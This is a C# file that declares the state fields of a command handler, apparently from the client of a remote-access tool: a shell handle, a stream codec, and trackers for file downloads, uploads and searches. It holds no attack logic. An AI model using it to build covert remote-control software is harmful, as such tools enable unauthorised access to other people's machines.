﻿using System;
using System.Collections.Generic;
using System.Threading;
using xClient.Core.Registry;
using xClient.Core.Utilities;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN VARIABLES NECESSARY FOR VARIOUS COMMANDS (if needed). */
    public static partial class CommandHandler
    {
        public static UnsafeStreamCodec StreamCodec;
        private static Shell _shell;
        private static Dictionary<int, string> _renamedFiles = new Dictionary<int, string>();
        private static Dictionary<int, string> _canceledDownloads = new Dictionary<int, string>();
        private static Dictionary<int, string> _pausedDownloads = new Dictionary<int, string>();
        private static Dictionary<int, string> _pausedUploads = new Dictionary<int, string>();
        private const string DELIMITER = "$E$";
        private static readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
        private static CancellationTokenSource _searchTokenSource;
        private static readonly ManualResetEvent _searchThreadReset = new ManualResetEvent(false);
        private static int _itemsFound;
    }
}